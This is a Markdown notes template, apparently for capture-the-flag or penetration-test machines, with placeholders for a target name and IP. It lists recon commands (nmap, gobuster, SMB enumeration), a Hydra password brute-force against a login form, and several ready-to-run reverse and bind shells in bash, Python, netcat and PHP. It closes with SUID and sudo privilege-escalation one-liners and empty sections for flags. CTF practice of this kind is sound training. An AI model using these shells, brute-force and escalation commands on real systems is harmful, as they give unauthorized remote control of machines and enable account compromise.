# Notes: {{.Name}}

## RECON

* set `/etc/hosts` for {{.IPAddress}} if you see a domain.
* enumerate subdomains `dig axfr <domain> @{{.IPAddress}}`

### NMAP

_note: zsh needs quotations around wildcard `*`._

scan ports ALL:

`nmap -v -Pn -p- --min-rate=5000 -oN nmap-{{.Name}}.txt {{.IPAddress}}`

scan version, OS:

`nmap -v -Pn -p- -sC -sV -O --min-rate=5000 -oN nmap-version-{{.Name}}.txt {{.IPAddress}}`

vuln scan ALL:

`nmap -v -Pn -p- -sV --script "vuln*" -oN nmap-vuln-{{.Name}}.txt {{.IPAddress}}`

#### SAMBA 

samba enum, vuln:

`nmap -v -Pn -p 139,445 --script smb-enum-shares {{.IPAddress}} -oN nmap-smb-shares-{{.Name}}.txt`

`nmap -v -Pn -p 139,445 --script "smb-vuln*" {{.IPAddress}} -oN nmap-smb-vuln-{{.Name}}.txt`

* list `smbclient -L //{{.IPAddress}}`
* login `smbclient //{{.IPAddress}}/<DIR>`

### GOBUSTER / FEROXBUSTER

general enumeration:

`gobuster dir -e -u http://{{.IPAddress}} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-{{.Name}}.txt`

add `-k` for `https`

extension scan:

`gobuster dir -x cgi,php,sh,log, -u http://{{.IPAddress}}/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions.txt`

Wordlists:

* [ ] `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
* [ ] `/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-*`

## CRACKING

### Hydra

Format:

* `-l` login, `-L` wordlist for logins
* `-p` password, `-P` wordlist for passwords
* `-V`
* `http-post-form` or `https-post-form`
* `"login form":"POST form":"Failed Message"` see example below

```bash
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt {{.IPAddress}} -V https-post-form '/index.php:__csrf_magic=sid%3Ad09980e510f7e924131941c772682ffbc566d7b3%2C1650961765&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect'
```

## REVERSE SHELLS

### bash

```bash
export RHOST={{.IPAddress}}
export RPORT=443
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```

listener: `sudo rlwrap nc -nlvp 443`

### bind shell

traditional nc only (i.e. with `-e` option):

```bash
# on target machine
LPORT=12345
nc -l -p $LPORT -e /bin/sh 
```

### python

```bash
export RHOST={{.IPAddress}}
export RPORT=12345
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```

listener: `socat file:`tty`,raw,echo=0 tcp-listen:12345`

if you get root to run this, you get a root shell:

```python
#!/usr/bin/python

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{{.IPAddress}}",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

short python:

```python
import os
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{.IPAddress}} 4444 >/tmp/f')
```

PHP

```php
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{.IPAddress}} 443 >/tmp/f');
?>
```

### Upgrade your shell

Python:

```bash
which python 
python -c 'import pty; pty.spawn("/bin/bash")'
```

Bash:

```bash
SHELL=/bin/bash script -q /dev/null
```

STTY:

1. `ctrl-z` to background your reverse shell
2. attack machine: `stty raw -echo` to send control characters through the reverse shell
3. attack machine: `stty size` and take note of rows & cols
4. `fg` to foreground your reverse shell again

finally, on target:

```bash
export SHELL=bash
stty rows $x columns $y #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

## ENUMERATE LINUX

* [ ] `sudo -l`
* [ ] `find / -user $username` - find everything this user owns.
* [ ] `find / -perm /4000 2>/dev/null` find suids
* [ ] credentail re-use -- logins? SSH? re-try existing creds against all logins.


Other finds:

```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null 
find / -perm -o x -type d 2>/dev/null 
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

## PRIVESC

### SUID & SUDO

* [ ] if suid file run `less`, `man`, type `!/bin/sh` inside + enter

bash:

```bash
# suid: get suid bin to run this
./bash -p
# sudo: 
sudo bash
```

python:

```bash
# suid: get the suid bin to run this 
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# sudo: spawn /bin/sh
sudo python -c 'import os; os.system("/bin/sh")'
```

## FLAGS

### user.txt

```bash

```

### root.txt

```bash

```

## LESSONS LEARNED

